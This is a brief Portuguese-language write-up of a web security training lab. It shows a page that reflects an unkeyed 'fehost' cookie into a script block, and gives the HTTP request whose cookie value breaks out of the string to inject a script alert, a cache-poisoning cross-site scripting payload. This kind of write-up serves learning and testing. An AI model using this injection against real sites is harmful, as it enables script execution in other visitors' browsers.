#ctf

Neste lab ao fazer uma requisição é possível perceber que a página faz uso do cookie fehost ao retornar no html

```html
<script>
    data = {
        "host":"0a1b00dd04cf78fa83774b21001b002f.web-security-academy.net",
        "path":"/",
        "frontend":"prod-cache-01"
    }
</script>
```

Escaping a string do fehost temos:

```
GET / HTTP/2
Host: 0a1b00dd04cf78fa83774b21001b002f.web-security-academy.net
Cookie: session=TrSMFdpEOsee901J6NzjBp2AoxMTFxad; fehost=prod-cache-02"}</script><script>alert(1)</script>
```

GG